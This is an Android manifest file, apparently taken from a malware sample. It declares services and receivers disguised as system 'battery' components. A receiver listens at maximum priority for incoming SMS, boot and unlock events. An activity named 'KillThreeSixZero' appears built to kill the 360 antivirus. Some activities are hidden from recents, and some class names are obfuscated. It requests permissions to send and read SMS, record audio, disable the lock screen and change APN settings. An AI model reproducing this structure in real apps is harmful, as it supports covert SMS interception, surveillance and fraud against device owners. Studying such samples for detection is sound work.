<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.keji.sendere">
    <application android:icon="@drawable/icon" android:label="@string/app_name" android:multiprocess="true">
        <activity android:label="@string/app_name" android:name=".Start">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <receiver android:name="sms.SMSreceiver">
            <intent-filter android:priority="100">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>
        <activity android:name="FileView"/>
        <activity android:name="FileBrowse"/>
        <activity android:name="Recorder"/>
        <activity android:name="ReceiveCode"/>
        <activity android:name="FileReady"/>
        <service android:name="FileSender" android:process=":remote"/>
        <service android:name="FileReceive"/>
        <service android:name="service.MainRun" android:process=":three"/>
        <service android:name="service.SystemPlus" android:process=":two"/>
        <receiver android:name="bh$gl" android:process=":remote"/>
        <service android:name="com.android.battery.BridgeProvider">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
            </intent-filter>
        </service>
        <receiver android:name="com.android.battery.BaseBroadcastReceiver">
            <intent-filter android:priority="2147483647">
                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.INPUT_METHOD_CHANGED"/>
                <action android:name="android.provider.Telephony.SIM_FULL"/>
                <action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED"/>
                <action android:name="android.intent.action.BATTERY_LOW"/>
                <action android:name="android.intent.action.BATTERY_OKAY"/>
                <action android:name="android.intent.action.USER_PRESENT"/>
            </intent-filter>
        </receiver>
        <service android:name="Q$cj"/>
        <service android:name="com.android.battery.PhoneService"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.android.battery.BalckActivity2" android:screenOrientation="portrait"/>
        <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.android.battery.BalckActivity" android:screenOrientation="portrait"/>
        <activity android:excludeFromRecents="true" android:name="com.android.battery.KillThreeSixZero" android:screenOrientation="portrait" android:theme="@style/Transparent"/>
        <meta-data android:name="APP_UID" android:value="f1cd8ba"/>
    </application>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
</manifest>